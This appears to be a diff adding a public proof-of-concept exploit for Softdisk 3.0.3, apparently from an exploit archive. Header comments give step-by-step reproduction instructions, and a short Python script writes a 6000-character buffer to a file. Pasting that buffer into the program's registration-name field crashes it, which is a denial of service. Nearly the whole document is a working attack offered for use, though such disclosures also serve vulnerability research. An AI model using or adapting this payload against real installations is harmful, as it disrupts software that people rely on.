@@ -1,0 +1,27 @@
+# Exploit Title: Softdisk 3.0.3 - Denial Of Service (PoC)
+# Author: Gionathan "John" Reale
+# Discovey Date: 2018-08-22
+# Homepage: http://www.ezbsystems.com/
+# Software Link: https://www.ezbsystems.com/softdisc/download.htm
+# Tested Version: 3.0.3
+# Tested on OS: Windows 7 32-bit
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "exploit.txt" just copy the text inside "exploit.txt"
+# and start the program. In the new window click "Help" >"Enter Registration Code...". 
+# Now in the new window paste the content of "exploit.txt" into the field:"Registration Name" 
+# and add the following into the "Registration Code" field:"1234567891011121". 
+# Click "OK" and you will see a crash.
+
+#!/usr/bin/python
+   
+buffer = "A" * 6000
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
